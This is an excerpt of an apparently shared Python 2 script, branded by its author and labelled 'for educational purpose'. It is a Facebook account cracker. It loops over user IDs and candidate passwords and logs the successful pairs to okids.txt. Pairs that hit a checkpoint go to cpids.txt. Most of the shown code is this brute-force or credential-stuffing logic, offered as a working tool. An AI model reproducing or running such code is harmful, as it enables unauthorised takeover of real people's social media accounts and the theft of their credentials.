#Script Given By Hamza Munir
#Script Is Given For Educational Purpose
#Script Editeimpor  Hamza Munir
#Utf-8 python 
...
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Hamza Munir Official
\033[1;92mFb \033[1;93m: Hamzamunirhasilpur
...
def main():
    ...
    print ' \033[0m[3].\x1b[1;96m Youtube Channel '
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open www.facebook.com/Hamzamunirhasilpur')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://youtube.com/channel/Hamzamunirofficial')
        main()
    else:
        print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[HAMZA-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31m[HAMZA-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
